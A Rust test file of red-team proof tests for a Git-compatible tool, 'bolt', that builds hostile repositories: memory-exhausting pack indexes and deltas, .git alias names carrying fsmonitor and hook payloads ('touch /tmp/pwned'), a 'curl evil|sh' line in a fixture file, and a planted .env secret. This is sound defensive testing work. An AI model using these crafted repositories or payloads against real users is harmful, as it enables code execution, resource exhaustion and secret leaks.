//! Red-team proof tests for milestone 2 (decision 024): each asserts the safe behaviour and
//! fails on the code the session attacked. See docs/redteam/2026-11-03-milestone-2.md.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

mod support;

use std::fs;
use std::path::Path;
use std::process::{Command, Output};

use bolt_core::git::craft::{Craft, digest, entry_header, zlib};
use bolt_core::git::{GitId, HashKind, ObjectType, object_id};
use bolt_core::history::current_save;
use bolt_core::listing::EntryKind;
use bolt_core::repo::Repository;
use support::run_limited;
use tempfile::TempDir;

use ObjectType::{Blob, Commit, Tree};

struct Env {
    work: TempDir,
    config: TempDir,
}

impl Env {
    fn new() -> Env {
        Env {
            work: tempfile::tempdir().unwrap(),
            config: tempfile::tempdir().unwrap(),
        }
    }

    fn root(&self) -> &Path {
        self.work.path()
    }

    fn bolt(&self, args: &[&str]) -> Command {
        let mut cmd = Command::new(assert_cmd::cargo::cargo_bin("bolt"));
        cmd.args(args)
            .current_dir(self.root())
            .env_remove("BOLT_FAULT_AT")
            .env("BOLT_CONFIG_DIR", self.config.path())
            .env("BOLT_USER_NAME", "Test")
            .env("BOLT_USER_EMAIL", "test@example.com");
        cmd
    }

    fn run(&self, args: &[&str]) -> Output {
        self.bolt(args).output().unwrap()
    }

    fn ok(&self, args: &[&str]) -> Output {
        let out = self.run(args);
        assert_eq!(
            out.status.code(),
            Some(0),
            "bolt {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        out
    }

    /// Writes `file` in the work tree, as Git would have checked it out.
    fn write(&self, file: &str, bytes: &[u8]) {
        let path = self.root().join(file);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, bytes).unwrap();
    }
}

fn text(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes).into_owned()
}

/// Every path in the save the project is on, folders included.
fn saved_paths(root: &Path) -> Vec<String> {
    let repo = Repository::open(root).unwrap();
    let save = repo
        .store()
        .save(&current_save(&repo).unwrap(), false)
        .unwrap();
    let mut out = Vec::new();
    let mut todo = vec![(String::new(), save.root)];
    while let Some((prefix, id)) = todo.pop() {
        for e in repo.store().listing(&id).unwrap().entries() {
            let path = format!("{prefix}{}", e.name);
            if e.kind == EntryKind::Folder {
                todo.push((format!("{path}/"), e.id));
            }
            out.push(path);
        }
    }
    out.sort();
    out
}

/// The bytes of the file at `path` in the save the project is on.
fn saved_file(root: &Path, path: &str) -> Vec<u8> {
    let repo = Repository::open(root).unwrap();
    let save = repo
        .store()
        .save(&current_save(&repo).unwrap(), false)
        .unwrap();
    let mut id = save.root;
    let mut names = path.split('/').peekable();
    while let Some(name) = names.next() {
        let listing = repo.store().listing(&id).unwrap();
        let entry = listing.get(name).unwrap().clone();
        id = entry.id;
        if names.peek().is_none() {
            let mut bytes = Vec::new();
            repo.store().copy_content(&id, &mut bytes).unwrap();
            return bytes;
        }
    }
    unreachable!()
}

const PEOPLE: &str = "author Ada <ada@example.com> 1700000000 +0000\n\
                      committer Ada <ada@example.com> 1700000000 +0000\n";

fn commit_bytes(tree: &GitId, parents: &[GitId], message: &str) -> Vec<u8> {
    let mut raw = format!("tree {}\n", tree.to_hex());
    for parent in parents {
        raw += &format!("parent {}\n", parent.to_hex());
    }
    format!("{raw}{PEOPLE}\n{message}").into_bytes()
}

fn sha1(kind: ObjectType, data: &[u8]) -> GitId {
    object_id(kind, data, HashKind::Sha1).unwrap()
}

/// A one-commit repository on `main` whose tree holds `files` (in Git's order), checked out in the
/// work tree as Git would.
fn one_commit(env: &Env, files: &[(&str, &[u8])]) -> Craft {
    let git = Craft::new(env.root(), HashKind::Sha1);
    let entries: Vec<(&[u8], &[u8], GitId)> = files
        .iter()
        .map(|(name, bytes)| (&b"100644"[..], name.as_bytes(), git.object(Blob, bytes)))
        .collect();
    let tree = git.tree(&entries);
    let commit = git.commit(&commit_bytes(&tree, &[], "One\n"));
    git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
    for (name, bytes) in files {
        env.write(name, bytes);
    }
    git
}

// A pack and its version 2 index, written as Git writes them, for repositories too big to build
// in memory with `Craft::pack`, which keeps every object it writes.

/// A delta's size field, and an `OFS_DELTA`'s distance back to its base.
fn varint(mut n: u64) -> Vec<u8> {
    let mut out = Vec::new();
    while n >= 0x80 {
        out.push((n & 0x7f) as u8 | 0x80);
        n >>= 7;
    }
    out.push(n as u8);
    out
}

fn ofs_distance(mut distance: u64) -> Vec<u8> {
    let mut out = vec![(distance & 0x7f) as u8];
    distance >>= 7;
    while distance > 0 {
        distance -= 1;
        out.push(0x80 | (distance & 0x7f) as u8);
        distance >>= 7;
    }
    out.reverse();
    out
}

/// A delta instruction copying `len` bytes (at most 0xFFFFFF) from `offset` in the base.
fn copy(offset: u64, len: u64) -> Vec<u8> {
    let (mut op, mut args) = (0x80u8, Vec::new());
    for (i, bit) in [0x01u8, 0x02, 0x04, 0x08].into_iter().enumerate() {
        let b = (offset >> (8 * i)) as u8;
        if b != 0 {
            op |= bit;
            args.push(b);
        }
    }
    for (i, bit) in [0x10u8, 0x20, 0x40].into_iter().enumerate() {
        let b = (len >> (8 * i)) as u8;
        if b != 0 {
            op |= bit;
            args.push(b);
        }
    }
    [vec![op], args].concat()
}

fn insert(bytes: &[u8]) -> Vec<u8> {
    bytes
        .chunks(127)
        .flat_map(|c| [vec![c.len() as u8], c.to_vec()].concat())
        .collect()
}

fn crc32(bytes: &[u8]) -> u32 {
    let mut crc = !0u32;
    for &byte in bytes {
        crc ^= u32::from(byte);
        for _ in 0..8 {
            crc = (crc >> 1) ^ (0xedb8_8320 & (crc & 1).wrapping_neg());
        }
    }
    !crc
}

struct PackOut {
    pack: Vec<u8>,
    rows: Vec<(Vec<u8>, u32, u64)>,
}

impl PackOut {
    fn new(count: u32) -> PackOut {
        let mut pack = b"PACK".to_vec();
        pack.extend_from_slice(&2u32.to_be_bytes());
        pack.extend_from_slice(&count.to_be_bytes());
        PackOut {
            pack,
            rows: Vec::new(),
        }
    }

    fn push(&mut self, entry: Vec<u8>, id: &[u8]) -> u64 {
        let at = self.pack.len() as u64;
        self.rows.push((id.to_vec(), crc32(&entry), at));
        self.pack.extend_from_slice(&entry);
        at
    }

    fn whole(&mut self, code: u8, data: &[u8], id: &[u8]) -> u64 {
        let entry = [entry_header(code, data.len() as u64), zlib(data)].concat();
        self.push(entry, id)
    }

    fn ofs_delta(&mut self, base_at: u64, delta: &[u8], id: &[u8]) -> u64 {
        let at = self.pack.len() as u64;
        let entry = [
            entry_header(6, delta.len() as u64),
            ofs_distance(at - base_at),
            zlib(delta),
        ]
        .concat();
        self.push(entry, id)
    }

    fn finish(mut self, root: &Path) {
        let checksum = digest(HashKind::Sha1, &self.pack);
        self.pack.extend_from_slice(&checksum);
        self.rows.sort();
        let mut idx = b"\xfftOc".to_vec();
        idx.extend_from_slice(&2u32.to_be_bytes());
        for byte in 0..=255u8 {
            let below = self.rows.iter().filter(|r| r.0[0] <= byte).count() as u32;
            idx.extend_from_slice(&below.to_be_bytes());
        }
        for row in &self.rows {
            idx.extend_from_slice(&row.0);
        }
        for row in &self.rows {
            idx.extend_from_slice(&row.1.to_be_bytes());
        }
        for row in &self.rows {
            idx.extend_from_slice(&(row.2 as u32).to_be_bytes());
        }
        idx.extend_from_slice(&checksum);
        let sum = digest(HashKind::Sha1, &idx);
        idx.extend_from_slice(&sum);
        let name: String = checksum.iter().map(|b| format!("{b:02x}")).collect();
        let dir = root.join(".git/objects/pack");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join(format!("pack-{name}.pack")), &self.pack).unwrap();
        fs::write(dir.join(format!("pack-{name}.idx")), &idx).unwrap();
    }
}

// RT3-1: Git's pack index is read into memory sized by the object count its own fan-out claims,
// checked only against the file's length. A sparse .idx costs nothing on disk and survives
// `tar --sparse` (a 464-byte archive in redteam/attacks3/sparse-idx.sh).

#[cfg(target_os = "linux")]
#[test]
fn rt3_1_a_sparse_git_pack_index_does_not_make_import_allocate_its_size() {
    let env = Env::new();
    let git = Craft::new(env.root(), HashKind::Sha1);
    // Looking up `main`'s commit loads every pack's index first.
    git.loose_ref("refs/heads/main", &format!("{}\n", "11".repeat(20)));
    let count: u64 = 60_000_000;
    let pack = env
        .root()
        .join(".git/objects/pack")
        .join(format!("pack-{}", "ab".repeat(20)));
    fs::create_dir_all(pack.parent().unwrap()).unwrap();
    let mut head = b"\xfftOc".to_vec();
    head.extend_from_slice(&2u32.to_be_bytes());
    for _ in 0..256 {
        head.extend_from_slice(&(count as u32).to_be_bytes());
    }
    let idx_path = pack.with_extension("idx");
    fs::write(&idx_path, &head).unwrap();
    // The rest of the length the count needs, as a hole: names, CRCs, offsets, checksums.
    fs::OpenOptions::new()
        .write(true)
        .open(&idx_path)
        .unwrap()
        .set_len(8 + 1024 + 28 * count + 40)
        .unwrap();
    fs::write(
        pack.with_extension("pack"),
        [b"PACK\0\0\0\x02\0\0\0\0".as_slice(), &[0; 20]].concat(),
    )
    .unwrap();
    let end = run_limited(env.bolt(&["import"]), 120);
    assert!(
        end.peak_mb < 256,
        "`bolt import` of a repository whose only pack index is a {} MB hole took {} MB: {end:?}",
        (8 + 1024 + 28 * count + 40) >> 20,
        end.peak_mb
    );
}

// RT3-2: a chain of merges of 1,024 parents, each a ~60-byte delta in Git's pack. Pass 1 holds
// every merge's parent list twice on its stack, and `order` keeps it through pass 2; each save then
// stores 1,024 parent IDs whole. Memory and the new .bolt grow ~80 KB and ~33 KB a merge.

/// `n` merges of 1,024 parents in a ~110-bytes-a-merge pack: 1,024 roots, then each merge has the
/// one before and 1,023 of the roots as parents. Returns the size of `.git`.
#[cfg(target_os = "linux")]
fn octopus_chain(root: &Path, n: usize) -> u64 {
    let git = Craft::new(root, HashKind::Sha1);
    let tree = sha1(Tree, b"");
    let mut pack = PackOut::new((1 + 1024 + n) as u32);
    pack.whole(2, b"", tree.as_bytes());
    let mut roots = Vec::new();
    for j in 0..1024 {
        let data = commit_bytes(&tree, &[], &format!("root {j}\n"));
        let id = sha1(Commit, &data);
        pack.whole(1, &data, id.as_bytes());
        roots.push(id);
    }
    let base = commit_bytes(&tree, &roots, "merge\n");
    let mut tip = sha1(Commit, &base);
    let base_at = pack.whole(1, &base, tip.as_bytes());
    // "tree <hex>\n", then the first "parent <hex>\n", which each later merge swaps.
    let (head, tail) = (46u64, 94u64);
    let len = base.len() as u64;
    for _ in 1..n {
        let line = format!("parent {}\n", tip.to_hex());
        let data = [&base[..46], line.as_bytes(), &base[94..]].concat();
        let delta = [
            varint(len),
            varint(len),
            copy(0, head),
            insert(line.as_bytes()),
            copy(tail, len - tail),
        ]
        .concat();
        tip = sha1(Commit, &data);
        pack.ofs_delta(base_at, &delta, tip.as_bytes());
    }
    pack.finish(root);
    git.loose_ref("refs/heads/main", &format!("{}\n", tip.to_hex()));
    dir_size(&root.join(".git"))
}

fn dir_size(dir: &Path) -> u64 {
    let mut total = 0;
    let mut todo = vec![dir.to_owned()];
    while let Some(dir) = todo.pop() {
        for e in fs::read_dir(dir).unwrap() {
            let e = e.unwrap();
            let meta = e.metadata().unwrap();
            if meta.is_dir() {
                todo.push(e.path());
            } else {
                total += meta.len();
            }
        }
    }
    total
}

#[cfg(target_os = "linux")]
#[test]
fn rt3_2_importing_a_small_chain_of_octopus_merges_needs_little_memory() {
    let env = Env::new();
    let git_bytes = octopus_chain(env.root(), 8_000);
    let end = run_limited(env.bolt(&["import"]), 600);
    let bolt_bytes = if env.root().join(".bolt").exists() {
        dir_size(&env.root().join(".bolt"))
    } else {
        0
    };
    assert!(
        matches!(end.code, Some(0 | 1)) && end.peak_mb < 256,
        "`bolt import` of a {git_bytes}-byte Git repository took {} MB of memory and wrote a \
         {bolt_bytes}-byte .bolt: {end:?}",
        end.peak_mb
    );
}

// RT3-3: miniz_oxide 0.9.1 ends some valid zlib streams early when they are inflated a piece at
// a time, as Bolt's Inflater does: big, mostly-zero files (180 MiB and more in the sweep). The
// size check stops the import, which then calls a valid repository damaged.

#[test]
fn rt3_3_a_valid_200_mib_file_of_zeros_imports() {
    let env = Env::new();
    let zeros = vec![0u8; 200 << 20];
    let git = Craft::new(env.root(), HashKind::Sha1);
    let blob = git.object(Blob, &zeros);
    drop(zeros);
    let tree = git.tree(&[(b"100644", b"disk.img", blob)]);
    let commit = git.commit(&commit_bytes(&tree, &[], "A disk image\n"));
    git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
    let out = env.run(&["import"]);
    assert_eq!(
        out.status.code(),
        Some(0),
        "a valid repository (its object is miniz_oxide's own zlib output) was refused: {}",
        text(&out.stderr)
    );
}

// RT3-4: delta-base amplification. Bolt's base cache holds 256 MiB, so a base built to 300 MiB is
// never kept: every read of every commit on it rebuilds it, through every delta below it. Here
// 16 commits sit on a 300 MiB object rebuilt through 8 deltas (a ~6 KB .git).

#[test]
fn rt3_4_commits_on_one_huge_delta_base_import_in_reasonable_time() {
    let env = Env::new();
    let git = Craft::new(env.root(), HashKind::Sha1);
    let (n, depth, size) = (16usize, 8u64, 300u64 << 20);
    let mut pack = PackOut::new((1 + depth + 1) as u32 + n as u32);
    // Made-up IDs for the big objects: only the commits are looked up by ID.
    let fake = |k: u64| [&[0xfe][..], &k.to_be_bytes(), &[0; 11]].concat();
    let mut at = pack.whole(1, &vec![0; 1 << 20], &fake(0));
    let grow = [
        varint(1 << 20),
        varint(size),
        copy(0, 1 << 20).repeat((size >> 20) as usize),
    ]
    .concat();
    at = pack.ofs_delta(at, &grow, &fake(1));
    for level in 2..=depth {
        let mut delta = [varint(size), varint(size)].concat();
        let mut done = 0;
        while done < size - 8 {
            let step = (size - 8 - done).min(0xff_0000);
            delta.extend(copy(done, step));
            done += step;
        }
        delta.extend(insert(&level.to_be_bytes()));
        at = pack.ofs_delta(at, &delta, &fake(level));
    }
    let tree = sha1(Tree, b"");
    pack.whole(2, b"", tree.as_bytes());
    let mut tip: Option<GitId> = None;
    for i in 0..n {
        let data = commit_bytes(&tree, tip.as_slice(), &format!("commit {i}\n"));
        let id = sha1(Commit, &data);
        let delta = [varint(size), varint(data.len() as u64), insert(&data)].concat();
        pack.ofs_delta(at, &delta, id.as_bytes());
        tip = Some(id);
    }
    pack.finish(env.root());
    git.loose_ref("refs/heads/main", &format!("{}\n", tip.unwrap().to_hex()));
    let git_bytes = dir_size(&env.root().join(".git"));
    let end = run_limited(env.bolt(&["import"]), 20);
    assert!(
        !end.timed_out,
        "`bolt import` of {n} commits in a {git_bytes}-byte Git repository was still running \
         after 20 s: {end:?}"
    );
}

// RT3-8: `Converter::stream` reads a big blob twice, through two readers bound to the same name.
// A shadowed binding lives to the end of the function, so a deltified blob, which the first reader
// rebuilt whole in memory, is held a third time while the second rebuilds it: three times the
// file's size at the peak where the limits allow two.

#[cfg(target_os = "linux")]
#[test]
fn rt3_8_streaming_a_deltified_blob_holds_it_at_most_twice() {
    let env = Env::new();
    let git = Craft::new(env.root(), HashKind::Sha1);
    let size: u64 = 300 << 20;
    let mut pack = PackOut::new(5);
    let fake = |k: u64| [&[0xfe][..], &k.to_be_bytes(), &[0; 11]].concat();
    let mut at = pack.whole(3, &vec![0; 1 << 20], &fake(0));
    let grow = [
        varint(1 << 20),
        varint(size),
        copy(0, 1 << 20).repeat((size >> 20) as usize),
    ]
    .concat();
    at = pack.ofs_delta(at, &grow, &fake(1));
    // The file: the 300 MiB above with its last 8 bytes its own.
    let mut delta = [varint(size), varint(size)].concat();
    let mut done = 0;
    while done < size - 8 {
        let step = (size - 8 - done).min(0xff_0000);
        delta.extend(copy(done, step));
        done += step;
    }
    delta.extend(insert(b"the end!"));
    let mut data = vec![0u8; size as usize];
    data[size as usize - 8..].copy_from_slice(b"the end!");
    let blob = sha1(Blob, &data);
    drop(data);
    pack.ofs_delta(at, &delta, blob.as_bytes());
    let tree_data = [b"100644 big.bin\0".as_slice(), blob.as_bytes()].concat();
    let tree = sha1(Tree, &tree_data);
    pack.whole(2, &tree_data, tree.as_bytes());
    let commit_data = commit_bytes(&tree, &[], "A big file\n");
    let commit = sha1(Commit, &commit_data);
    pack.whole(1, &commit_data, commit.as_bytes());
    pack.finish(env.root());
    git.loose_ref("refs/heads/main", &format!("{}\n", commit.to_hex()));
    let end = run_limited(env.bolt(&["import"]), 600);
    assert!(
        end.code == Some(0) && end.peak_mb < 750,
        "importing one 300 MiB deltified file took {} MB: {end:?}",
        end.peak_mb
    );
}

// RT3-9: each tag keeps a copy of its tag objects' bytes, so 300 refs to one compressible tag
// object of almost 1 MiB make a 300 MiB tag list from a ~90 KB repository, within the 512 MiB
// budget. The import then holds it about four times over: the tags, the encoded record (grown by
// doubling), and the read-back check's decoded copy.

#[cfg(target_os = "linux")]
#[test]
#[ignore = "RT3-9: red-team proof, run once its fix is in"]
fn rt3_9_storing_a_tag_list_takes_at_most_twice_its_size() {
    let env = Env::new();
    let git = one_commit(&env, &[("a.txt", b"a\n")]);
    let commit = fs::read_to_string(env.root().join(".git/refs/heads/main")).unwrap();
    let head = format!(
        "object {}type commit\ntag t\ntagger T <t@example.com> 1700000000 +0000\n\n",
        commit
    );
    let message = vec![b'x'; (1 << 20) - 200];
    let tag = git.object(ObjectType::Tag, &[head.as_bytes(), &message].concat());
    let mut packed = "# pack-refs with: peeled fully-peeled sorted \n".to_owned();
    for n in 0..300 {
        packed += &format!("{} refs/tags/t{n:03}\n", tag.to_hex());
    }
    git.packed_refs(&packed);
    let end = run_limited(env.bolt(&["import"]), 600);
    assert!(
        end.code == Some(0) && end.peak_mb < 650,
        "importing 300 tags (a 300 MiB tag list) took {} MB: {end:?}",
        end.peak_mb
    );
}

// RT3-10: a commit's `change-id` header (Jujutsu's) becomes its save's change ID, and nothing stops
// two commits from carrying the same one. `bolt history` then shows two saves as the same ID, and
// `bolt show` can't pick either by it: its hint says to type more of an ID that is already whole.

#[test]
#[ignore = "RT3-10: red-team proof, run once its fix is in"]
fn rt3_10_every_save_history_shows_can_be_picked_by_the_id_it_shows() {
    let env = Env::new();
    let git = Craft::new(env.root(), HashKind::Sha1);
    let file = |bytes: &[u8]| {
        let blob = git.object(Blob, bytes);
        git.tree(&[(b"100644", b"app.py", blob)])
    };
    let (good, evil) = (
        file(b"print(1)\n"),
        file(b"import os; os.system('curl evil|sh')\n"),
    );
    let commit = |tree: &GitId, parents: &[GitId]| {
        let mut raw = format!("tree {}\n", tree.to_hex());
        for parent in parents {
            raw += &format!("parent {}\n", parent.to_hex());
        }
        raw += PEOPLE;
        raw += "change-id zyxwvutsrqponmlkzyxwvutsrqponmlk\n\nRelease 1.0 (reviewed)\n";
        git.commit(raw.as_bytes())
    };
    let reviewed = commit(&good, &[]);
    let tip = commit(&evil, &[reviewed]);
    git.loose_ref("refs/heads/main", &format!("{}\n", tip.to_hex()));
    env.write("app.py", b"import os; os.system('curl evil|sh')\n");
    env.ok(&["import"]);
    let history = text(&env.ok(&["history"]).stdout);
    let ids: Vec<&str> = history
        .lines()
        .filter_map(|line| line.split_whitespace().next())
        .collect();
    assert_eq!(ids.len(), 2, "{history}");
    let shown = env.run(&["show", ids[1]]);
    assert!(
        ids[0] != ids[1] || shown.status.success(),
        "two saves show as {:?} in `bolt history`, and `bolt show {}` said: {}",
        ids[0],
        ids[1],
        text(&shown.stderr)
    );
}

// RT3-5: `bolt save` stores the spellings of `.git` that `bolt import` leaves out as dangerous
// and Git refuses to track: `.GIT`, `git~1` and `.git` with characters HFS+ ignores (Windows and
// macOS take each for `.git`, so writing them out there writes Git's config and hooks), and a
// `.git` file in a folder that isn't a project link. Linux only: elsewhere `.GIT` is `.git` on
// disk, which the walk already skips.

#[cfg(target_os = "linux")]
#[test]
#[ignore = "RT3-5: red-team proof, run once its fix is in"]
fn rt3_5_save_leaves_out_every_name_import_takes_for_git() {
    let env = Env::new();
    one_commit(&env, &[("readme.txt", b"hello\n")]);
    env.ok(&["import"]);
    let spellings = [".GIT", "git~1", ".g\u{200c}it", ".git\u{feff}"];
    for name in spellings {
        env.write(
            &format!("{name}/config"),
            b"[core]\n\tfsmonitor = touch /tmp/pwned\n",
        );
        env.write(
            &format!("{name}/hooks/post-checkout"),
            b"#!/bin/sh\ntouch /tmp/pwned\n",
        );
    }
    env.write("sub/.git", b"gitdir: /tmp/elsewhere.git\n");
    env.write("sub/notes.txt", b"mine\n");
    env.ok(&["save", "my work"]);
    let saved = saved_paths(env.root());
    let git_like: Vec<&String> = saved
        .iter()
        .filter(|path| path.split('/').any(bolt_core::names::is_git_alias))
        .collect();
    assert!(
        git_like.is_empty(),
        "the save holds names Bolt's import never brings in: {git_like:?}"
    );
}

/// RT3-5 on every system: the spellings that can be made anywhere, a `.git` pointer file in a
/// plain folder (a submodule added after the import) and `.git` with a character HFS+ ignores.
#[test]
#[ignore = "RT3-5B: red-team proof, run once its fix is in"]
fn rt3_5b_save_leaves_out_a_git_file_and_an_hfs_spelling_of_git_everywhere() {
    let env = Env::new();
    one_commit(&env, &[("readme.txt", b"hello\n")]);
    env.ok(&["import"]);
    env.write(
        ".g\u{200c}it/config",
        b"[core]\n\tfsmonitor = touch /tmp/pwned\n",
    );
    env.write("sub/.git", b"gitdir: ../.git/modules/sub\n");
    env.write("sub/notes.txt", b"mine\n");
    env.ok(&["save", "my work"]);
    let saved = saved_paths(env.root());
    let git_like: Vec<&String> = saved
        .iter()
        .filter(|path| path.split('/').any(bolt_core::names::is_git_alias))
        .collect();
    assert!(
        git_like.is_empty(),
        "the save holds names Bolt's import never brings in: {git_like:?}"
    );
}

// RT3-6: a hostile repository tracks `.env` with a placeholder and lists `.env` in .gitignore.
// Saved files stay saved (decision 038) and there is no add step, so the user's real secrets go
// into history on the next save, which names no file. Git keeps them out unless the user stages
// the file (`git add .env`, `-a`, `-A`), and `git status` lists it as modified first.

#[test]
#[ignore = "RT3-6: red-team proof, run once its fix is in"]
fn rt3_6_a_tracked_but_ignored_env_is_not_saved_silently() {
    let env = Env::new();
    one_commit(
        &env,
        &[
            (".env", b"API_KEY=put-yours-here\n"),
            (".gitignore", b".env\n"),
            ("app.py", b"print('hi')\n"),
        ],
    );
    env.ok(&["import"]);
    env.write(".env", b"API_KEY=sk_live_REAL_SECRET\n");
    env.write("app.py", b"print('hello')\n");
    let out = env.ok(&["save", "Say hello"]);
    let said = format!("{}{}", text(&out.stdout), text(&out.stderr));
    let kept = saved_file(env.root(), ".env");
    assert!(
        kept == b"API_KEY=put-yours-here\n" || said.contains(".env"),
        "the save took the user's .env ({:?}) and said only: {said}",
        text(&kept)
    );
}

// RT3-7: Git reads `core.sparseCheckout` from included config files too; Bolt reads only
// `.git/config` itself ("includes aren't followed", which is right for the format check alone).
// The import then goes ahead in a sparse checkout, and the first save records every file Git left
// out of the folder as deleted, which decision 039's refusal exists to prevent.

#[test]
#[ignore = "RT3-7: red-team proof, run once its fix is in"]
fn rt3_7_a_sparse_checkout_turned_on_through_an_include_is_refused() {
    let env = Env::new();
    let git = one_commit(&env, &[("a.txt", b"a\n"), ("b.txt", b"b\n")]);
    git.config("[core]\n\trepositoryformatversion = 0\n[include]\n\tpath = sparse.inc\n");
    git.file("sparse.inc", b"[core]\n\tsparseCheckout = true\n");
    git.file("info/sparse-checkout", b"/a.txt\n");
    // As Git leaves the work tree: only what the sparse patterns name.
    fs::remove_file(env.root().join("b.txt")).unwrap();
    let out = env.run(&["import"]);
    assert_eq!(
        out.status.code(),
        Some(1),
        "the import went ahead in a sparse checkout: {}",
        text(&out.stdout)
    );
    assert!(
        text(&out.stderr).contains("sparse"),
        "{}",
        text(&out.stderr)
    );
}
